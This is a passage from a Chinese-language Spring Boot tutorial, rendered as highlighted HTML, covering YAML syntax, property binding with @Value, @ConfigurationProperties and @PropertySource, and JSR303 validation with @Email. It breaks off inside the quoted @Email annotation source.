comment">#纯量包括：字符串，布尔值，整数，浮点数，Null，时间，日期</span><span class="token key atrule">boolean</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token boolean important">TRUE</span> <span class="token comment">#或者true，这里的true就是纯量</span>  <span class="token punctuation">-</span> <span class="token boolean important">FALSE</span><span class="token key atrule">float</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token number">3.14</span> <span class="token comment">#3.14也是纯量，纯量的意思就是一些常量</span>  <span class="token punctuation">-</span> <span class="token number">1.1415</span><span class="token key atrule">int</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token number">1</span>  <span class="token punctuation">-</span> <span class="token number">2</span><span class="token key atrule">null</span><span class="token punctuation">:</span>  <span class="token key atrule">nodename</span><span class="token punctuation">:</span> <span class="token string">'node'</span>  <span class="token key atrule">parent</span><span class="token punctuation">:</span> <span class="token null important">~</span> <span class="token comment">#使用~表示null</span><span class="token key atrule">string</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> 哈哈  <span class="token punctuation">-</span> hello  <span class="token punctuation">-</span> <span class="token string">"hello"</span> <span class="token comment">#加不加引号都无所谓</span><span class="token key atrule">data</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token datetime number">2022-12-12</span> <span class="token comment">#日期必须以yyyy-MM-dd的格式</span><span class="token key atrule">datatime</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token datetime number">2022-12-12T15:02:31+08:00</span> <span class="token comment">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="给属性赋值的几种方式"><a href="#给属性赋值的几种方式" class="headerlink" title="给属性赋值的几种方式"></a>给属性赋值的几种方式</h2><h3 id="传统派：Value赋值"><a href="#传统派：Value赋值" class="headerlink" title="传统派：Value赋值"></a>传统派：Value赋值</h3><p>使用<code>@Componet</code>注解<strong>表明这个类是一个bean</strong>，不用像SpringMVC那样去xml写<code>&lt;bean id=&quot;&quot; class=&quot;&quot;&gt;</code></p><blockquote><p>JavaBean是一种Java类，而且是一种特殊的、可重用的类：必须具有无参数的构造器，所有的属性都是private的，通过提供setter和getter方法来实现对成员属性的访问，需要被序列化并且实现了 Serializable 接口，bean的示例如下：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StudentsBean</span> <span class="token keyword">implements</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>Serializable</span><span class="token punctuation">&#123;</span>   <span class="token keyword">private</span> <span class="token class-name">String</span> firstName <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token class-name">String</span> lastName <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token keyword">int</span> age <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token class-name">StudentsBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getFirstName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> firstName<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getLastName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> lastName<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> age<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setFirstName</span><span class="token punctuation">(</span><span class="token class-name">String</span> firstName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>firstName <span class="token operator">=</span> firstName<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setLastName</span><span class="token punctuation">(</span><span class="token class-name">String</span> lastName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>lastName <span class="token operator">=</span> lastName<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在SpringBoot中只需要用注解<code>@Component</code>，然后就能开始写bean类了</p><blockquote><p>tips：IDEA中，alt+insert可以快速生成构造函数，getter，setter等方法</p></blockquote><p>写一个Cat类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>pojo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Value</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Integer</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"Cat&#123;"</span> <span class="token operator">+</span>                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再写一个Person类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>pojo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>context<span class="token punctuation">.</span>properties<span class="token punctuation">.</span></span><span class="token class-name">ConfigurationProperties</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Date</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@ConfigurationProperties</span><span class="token punctuation">(</span>prefix <span class="token operator">=</span> <span class="token string">"person"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Boolean</span> happy<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Date</span> birth<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> maps<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> lists<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Cat</span> cat<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Integer</span> age<span class="token punctuation">,</span> <span class="token class-name">Boolean</span> happy<span class="token punctuation">,</span> <span class="token class-name">Date</span> birth<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> maps<span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> lists<span class="token punctuation">,</span> <span class="token class-name">Cat</span> cat<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>happy <span class="token operator">=</span> happy<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>birth <span class="token operator">=</span> birth<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>maps <span class="token operator">=</span> maps<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>lists <span class="token operator">=</span> lists<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cat <span class="token operator">=</span> cat<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Boolean</span> <span class="token function">getHappy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> happy<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setHappy</span><span class="token punctuation">(</span><span class="token class-name">Boolean</span> happy<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>happy <span class="token operator">=</span> happy<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Date</span> <span class="token function">getBirth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> birth<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBirth</span><span class="token punctuation">(</span><span class="token class-name">Date</span> birth<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>birth <span class="token operator">=</span> birth<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token function">getMaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> maps<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMaps</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> maps<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>maps <span class="token operator">=</span> maps<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token function">getLists</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> lists<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setLists</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> lists<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>lists <span class="token operator">=</span> lists<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Cat</span> <span class="token function">getCat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> cat<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCat</span><span class="token punctuation">(</span><span class="token class-name">Cat</span> cat<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cat <span class="token operator">=</span> cat<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"Person&#123;"</span> <span class="token operator">+</span>                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>                <span class="token string">", happy="</span> <span class="token operator">+</span> happy <span class="token operator">+</span>                <span class="token string">", birth="</span> <span class="token operator">+</span> birth <span class="token operator">+</span>                <span class="token string">", maps="</span> <span class="token operator">+</span> maps <span class="token operator">+</span>                <span class="token string">", lists="</span> <span class="token operator">+</span> lists <span class="token operator">+</span>                <span class="token string">", cat="</span> <span class="token operator">+</span> cat <span class="token operator">+</span>                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后可以在Cat类里面添加<code>@Value</code>注解来赋值，需要一个个属性指定来进行赋值</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240708190439958.png" alt="image-20240708190439958"></p><hr><h3 id="Yaml配置文件绑定"><a href="#Yaml配置文件绑定" class="headerlink" title="Yaml配置文件绑定"></a>Yaml配置文件绑定</h3><p>在resources文件夹下创建application.yaml：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">person</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> 0w0  <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">20</span>  <span class="token key atrule">happy</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token key atrule">birth</span><span class="token punctuation">:</span> 2024/07/09  <span class="token key atrule">maps</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token key atrule">k1</span><span class="token punctuation">:</span> v1<span class="token punctuation">,</span><span class="token key atrule">k2</span><span class="token punctuation">:</span> v2<span class="token punctuation">&#125;</span>  <span class="token key atrule">lists</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> code    <span class="token punctuation">-</span> game    <span class="token punctuation">-</span> music  <span class="token key atrule">cat</span><span class="token punctuation">:</span>    <span class="token key atrule">name</span><span class="token punctuation">:</span> kitty    <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在Person.java中添加<code>@ConfigurationProperties(prefix = &quot;person&quot;)</code>注解把yaml配置文件绑定上去</p><blockquote><p>@ConfigurationProperties：将配置文件中配置的每一个属性的值，映射到这个组件中；参数<code>prefix</code>将配置文件中的所有属性进行一一对应</p></blockquote><p>和<code>@Value</code>的区别：</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709004523248.png" alt="image-20240709004523248"></p><blockquote><p>松散绑定：yaml中<code>last-name</code>和<code>lastName</code>是一样的，<code>-</code>后跟着的字母默认是大写的</p></blockquote><p>实例：</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709002814400.png" alt="image-20240709002814400"></p><p>接下来用test文件夹下的DemoApplicationTests进行测试打印，使用<code>@Autowired</code>注解，即自动装配</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709002908085.png" alt="image-20240709002908085"></p><p>成功打印出来</p><p>注意：yaml配置文件可以插入<strong>el表达式</strong></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709004217315.png" alt="image-20240709004217315"></p><hr><h3 id="Properties配置文件绑定"><a href="#Properties配置文件绑定" class="headerlink" title="Properties配置文件绑定"></a>Properties配置文件绑定</h3><p>这种方式和yaml差不多，都是通过配置文件进行指定</p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">name</span><span class="token punctuation">=</span><span class="token value attr-value">0w0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Person.java使用<code>@PropertySource</code>注解来加载指定的配置文件</p><p>然后用<code>@Value(&quot;$&#123;name&#125;&quot;)</code>这个SPEL表达式来取出配置文件的值</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709003745075.png" alt="image-20240709003745075"></p><hr><h2 id="JSR303校验"><a href="#JSR303校验" class="headerlink" title="JSR303校验"></a>JSR303校验</h2><blockquote><p>在字段中增加一层过滤器验证，保证数据的合法性</p></blockquote><p>SpringBoot中用<code>@Validated</code>来校验数据，如果数据异常则会统一抛出异常，方便异常中心统一处理</p><p>引入依赖：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>jakarta.validation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jakarta.validation-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.0.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>tips：如果安装依赖出现<code>connect timeout</code>的建议直接在maven下的conf&#x2F;setting.xml里添加代理，参考：<a href="https://www.feiyiblog.com/2021/07/09/maven%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/">https://www.feiyiblog.com/2021/07/09/maven%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</a></p></blockquote><p>这里写一个注解让name只能支持Email格式：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@ConfigurationProperties</span><span class="token punctuation">(</span>prefix <span class="token operator">=</span> <span class="token string">"person"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Validated</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Email</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当我们继续传入前面的name时就会报错</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709163549439.png" alt="image-20240709163549439"></p><p>跟进一下<code>@Email</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">jakarta<span class="token punctuation">.</span>validation<span class="token punctuation">.</span>constraints</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>validation<span class="token punctuation">.</span></span><span class="token class-name">Constraint</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>validation<span class="token punctuation">.</span></span><span class="token class-name">Payload</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Documented</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ElementType</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Repeatable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RetentionPolicy</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Documented</span><span class="token annotation punctuation">@Constraint</span><span class="token punctuation">(</span>    validatedBy <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">FIELD</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">ANNOTATION_TYPE</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">CONSTRUCTOR</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">PARAMETER</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">TYPE_USE</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token 